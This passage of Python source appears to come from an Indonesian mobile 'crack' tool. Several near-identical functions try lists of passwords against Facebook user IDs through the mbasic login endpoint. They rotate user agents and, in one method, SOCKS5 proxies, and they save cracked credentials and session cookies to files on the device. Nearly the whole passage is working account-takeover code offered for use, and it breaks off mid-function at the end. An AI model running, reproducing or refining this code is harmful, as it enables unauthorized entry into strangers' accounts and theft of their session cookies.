			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1971214313162948&kid_directed_site=0&app_id=1971214313162948&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D1971214313162948%26auth_type%26cbt%3D1697199459982%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f27dae9d33634%2526domain%253Dsfile.mobi%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fsfile.mobi%25252Ff16df3679170eec%2526relation%253Dopener%26client_id%3D1971214313162948%26config_id%26display%3Dtouch%26domain%3Dsfile.mobi%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fsfile.mobi%252Flogin.php%26force_confirmation%3Dfalse%26id%3Df2d5642fd81c854%26locale%3Den_US%26logger_id%3D8b1fa001-1968-4312-a43d-b4fb4b1f2f71%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1e8f4c4d3035c%2526domain%253Dsfile.mobi%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fsfile.mobi%25252Ff16df3679170eec%2526relation%253Dopener.parent%2526frame%253Df2d5642fd81c854%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1e8f4c4d3035c%26domain%3Dsfile.mobi%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fsfile.mobi%252Ff16df3679170eec%26relation%3Dopener.parent%26frame%3Df2d5642fd81c854%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{kun}Gagal Crack')
				tree.add(f'{kun}{idf}|{pw}{x}')
				# tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				os.popen('play-audio c.mp3')
				prints(tree)
				open('/sdcard/AKUN-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{hijo}Berhasil Crack{bv}')
				tree.add(f'{bv}TP : {tahunng(idf)}{hijo}')	
				tree.add(f'{hijo}{idf}{hijo}➤{pw}')
				tree.add(f'{hijo}{kuki}{ung}')
				tree.add(f'{ung}{ua}{x}')
				os.popen('play-audio o.mp3')
				prints(tree)
				open('/sdcard/AKUN-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				# cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-MBASIC ]----------#	
def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]VAL JIHAN 2 [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua = random.choice(usragent)
	ua2 = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			# if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D401339800076611%26auth_type%26cbt%3D1676387539322%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff727d02145c8%2526domain%253Daccount.ruangguru.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.ruangguru.com%25252Ff1f5c835c220418%2526relation%253Dopener%26client_id%3D401339800076611%26display%3Dtouch%26domain%3Daccount.ruangguru.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.ruangguru.com%252Flogin%253Fredirect_url%253Dhttps%25253A%25252F%25252Fapp.ruangguru.com%25252F%25253Futm_term%25253D%252526utm_campaign%25253DRG_UA_Performance-Max_Purchase_Ruangbelajar%252526utm_source%25253Dadwords%252526utm_medium%25253Dppc%252526hsa_acc%25253D6043944017%252526hsa_cam%25253D15819534912%252526hsa_grp%25253D%252526hsa_ad%25253D%252526hsa_src%25253Dx%252526hsa_tgt%25253D%252526hsa_kw%25253D%252526hsa_mt%25253D%252526hsa_net%25253Dadwords%252526hsa_ver%25253D3%252526gclid%25253DEAIaIQobChMIkcu8lKaV_QIVaZlmAh12oAa2EAAYASAAEgJaOvD_BwE%2526client_id%253Dapp-ruangguru%2526view%253Dlogin%26locale%3Den_US%26logger_id%3Dfa8c86e9273d3%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f2a243f50d4ac%2526domain%253Daccount.ruangguru.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.ruangguru.com%25252Ff1f5c835c220418%2526relation%253Dopener%2526frame%253Df10d1bf54ac03c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3f2a243f50d4ac%26domain%3Daccount.ruangguru.com%26is_can')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D401339800076611%26auth_type%26cbt%3D1676387539322%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff727d02145c8%2526domain%253Daccount.ruangguru.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.ruangguru.com%25252Ff1f5c835c220418%2526relation%253Dopener%26client_id%3D401339800076611%26display%3Dtouch%26domain%3Daccount.ruangguru.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.ruangguru.com%252Flogin%253Fredirect_url%253Dhttps%25253A%25252F%25252Fapp.ruangguru.com%25252F%25253Futm_term%25253D%252526utm_campaign%25253DRG_UA_Performance-Max_Purchase_Ruangbelajar%252526utm_source%25253Dadwords%252526utm_medium%25253Dppc%252526hsa_acc%25253D6043944017%252526hsa_cam%25253D15819534912%252526hsa_grp%25253D%252526hsa_ad%25253D%252526hsa_src%25253Dx%252526hsa_tgt%25253D%252526hsa_kw%25253D%252526hsa_mt%25253D%252526hsa_net%25253Dadwords%252526hsa_ver%25253D3%252526gclid%25253DEAIaIQobChMIkcu8lKaV_QIVaZlmAh12oAa2EAAYASAAEgJaOvD_BwE%2526client_id%253Dapp-ruangguru%2526view%253Dlogin%26locale%3Den_US%26logger_id%3Dfa8c86e9273d3%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f2a243f50d4ac%2526domain%253Daccount.ruangguru.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.ruangguru.com%25252Ff1f5c835c220418%2526relation%253Dopener%2526frame%253Df10d1bf54ac03c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{kun}Gagal Crack')
				tree.add(f'{kun}{idf}|{pw}{x}')
				# tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				os.popen('play-audio c.mp3')
				prints(tree)
				open('/sdcard/AKUN-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{hijo}Berhasil Crack{bv}')
				tree.add(f'{bv}TP : {tahunng(idf)}{hijo}')
				tree.add(f'{hijo}{idf}{hijo}➤{pw}')
				tree.add(f'{hijo}{kuki}{ung}')
				tree.add(f'{ung}{ua}{x}')
				os.popen('play-audio o.mp3')
				prints(tree)
				open('/sdcard/AKUN-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				# cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
#----------[ METODE-VLMB ]----------#	
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]VAL JIHAN 3 [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua = random.choice(usragent)
	ua2 = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			# if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D401339800076611%26auth_type%26cbt%3D1676387539322%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff727d02145c8%2526domain%253Daccount.ruangguru.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.ruangguru.com%25252Ff1f5c835c220418%2526relation%253Dopener%26client_id%3D401339800076611%26display%3Dtouch%26domain%3Daccount.ruangguru.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.ruangguru.com%252Flogin%253Fredirect_url%253Dhttps%25253A%25252F%25252Fapp.ruangguru.com%25252F%25253Futm_term%25253D%252526utm_campaign%25253DRG_UA_Performance-Max_Purchase_Ruangbelajar%252526utm_source%25253Dadwords%252526utm_medium%25253Dppc%252526hsa_acc%25253D6043944017%252526hsa_cam%25253D15819534912%252526hsa_grp%25253D%252526hsa_ad%25253D%252526hsa_src%25253Dx%252526hsa_tgt%25253D%252526hsa_kw%25253D%252526hsa_mt%25253D%252526hsa_net%25253Dadwords%252526hsa_ver%25253D3%252526gclid%25253DEAIaIQobChMIkcu8lKaV_QIVaZlmAh12oAa2EAAYASAAEgJaOvD_BwE%2526client_id%253Dapp-ruangguru%2526view%253Dlogin%26locale%3Den_US%26logger_id%3Dfa8c86e9273d3%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f2a243f50d4ac%2526domain%253Daccount.ruangguru.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.ruangguru.com%25252Ff1f5c835c220418%2526relation%253Dopener%2526frame%253Df10d1bf54ac03c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3f2a243f50d4ac%26domain%3Daccount.ruangguru.com%26is_can')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D401339800076611%26auth_type%26cbt%3D1676387539322%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff727d02145c8%2526domain%253Daccount.ruangguru.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.ruangguru.com%25252Ff1f5c835c220418%2526relation%253Dopener%26client_id%3D401339800076611%26display%3Dtouch%26domain%3Daccount.ruangguru.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.ruangguru.com%252Flogin%253Fredirect_url%253Dhttps%25253A%25252F%25252Fapp.ruangguru.com%25252F%25253Futm_term%25253D%252526utm_campaign%25253DRG_UA_Performance-Max_Purchase_Ruangbelajar%252526utm_source%25253Dadwords%252526utm_medium%25253Dppc%252526hsa_acc%25253D6043944017%252526hsa_cam%25253D15819534912%252526hsa_grp%25253D%252526hsa_ad%25253D%252526hsa_src%25253Dx%252526hsa_tgt%25253D%252526hsa_kw%25253D%252526hsa_mt%25253D%252526hsa_net%25253Dadwords%252526hsa_ver%25253D3%252526gclid%25253DEAIaIQobChMIkcu8lKaV_QIVaZlmAh12oAa2EAAYASAAEgJaOvD_BwE%2526client_id%253Dapp-ruangguru%2526view%253Dlogin%26locale%3Den_US%26logger_id%3Dfa8c86e9273d3%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f2a243f50d4ac%2526domain%253Daccount.ruangguru.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.ruangguru.com%25252Ff1f5c835c220418%2526relation%253Dopener%2526frame%253Df10d1bf54ac03c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{kun}Gagal Crack')
				tree.add(f'{kun}{idf}|{pw}{x}')
				# tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				os.popen('play-audio c.mp3')
				prints(tree)
				open('/sdcard/AKUN-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{hijo}Berhasil Crack{bv}')
				tree.add(f'{bv}TP : {tahunng(idf)}{hijo}')
				tree.add(f'{hijo}{idf}{hijo}➤{pw}')
				tree.add(f'{hijo}{kuki}{ung}')
				tree.add(f'{ung}{ua}{x}')
				os.popen('play-audio o.mp3')
				prints(tree)
				open('/sdcard/AKUN-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				# cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ METODE-VLMT ]----------#	
def metod4(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]VAL JIHAN [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua = random.choice(usragent)
	ua2 = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			# if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=123845574663321&kid_directed_site=0&app_id=123845574663321&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D123845574663321%26redirect_uri%3Dhttps%253A%252F%252Fcodepen.io%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D26d1811bed5e0a308313d4820bf0729f5d89bff3407a4285%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df23e176d-55ca-481b-8a6b-d08d75887a92%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcodepen.io%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D26d1811bed5e0a308313d4820bf0729f5d89bff3407a4285%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin':'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer':'https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fmbasic.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{kun}Gagal Crack')
				tree.add(f'{kun}{idf}|{pw}{x}')
				# tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				os.popen('play-audio c.mp3')
				prints(tree)
				open('/sdcard/AKUN-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{hijo}Berhasil Crack{bv}')
				tree.add(f'{bv}TP : {tahunng(idf)}{hijo}')
				tree.add(f'{hijo}{idf}{hijo}➤{pw}')
				tree.add(f'{hijo}{kuki}{ung}')
				tree.add(f'{ung}{ua}{x}')
				os.popen('play-audio o.mp3')
				prints(tree)
				open('/sdcard/AKUN-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				# cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#METOD PENGOCOK#
def metod5(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]VALKCK [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ua2 = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			# if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
